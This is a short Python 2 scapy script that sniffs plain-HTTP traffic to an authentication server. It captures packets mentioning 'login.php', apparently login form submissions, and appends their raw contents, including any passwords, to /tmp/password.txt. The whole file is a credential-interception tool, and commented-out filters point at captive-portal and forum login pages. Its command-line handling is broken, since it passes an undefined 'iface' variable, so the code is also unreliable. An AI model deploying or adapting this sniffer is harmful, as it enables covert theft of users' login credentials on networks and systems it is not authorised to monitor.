import scapy.all as scapy

def GET_print(packet):
    s = "\n".join(packet.sprintf("{Raw:%Raw.load%}").split(r"\r\n"))
    #if ("/ac_portal/login.php" in str(packet)) and ("POST" in str(packet)):
    #if ("discuz.php" in str(packet)) and ("POST" in str(packet)):
    if "login.php" in str(s) or ("login.php" in str(packet)):
        print "GET Pasword!"
        #s = "\n".join(packet.sprintf("{Raw:%Raw.load%}").split(r"\r\n"))
        f = open("/tmp/password.txt","a")
        f.write(s + "\n")
        f.write(str(packet) + "\n")
        f.close()
        #print s
        return packet.summary() + '\n' + s
    return None

def sniff(interface, authServer="1.1.1.2"):
    scapy.sniff(iface=interface,
                #lfilter=lambda p:"POST" in str(p),
                filter="tcp port 80 and ip dst " + str(authServer),
                prn=GET_print,
                store=False)

if __name__ == "__main__":
    import sys, argparse

    parser = argparse.ArgumentParser()

    parser.add_argument("-i", "--interface", nargs=1, type=str, dest="iface",
            help="the interface to sniff")
    parser.add_argument("-a", "--authServer", nargs=1, type=str, dest="authServer", default="1.1.1.2",
            help="the authentication server address")

    parser.parse_args()
    sniff(iface, authServer)
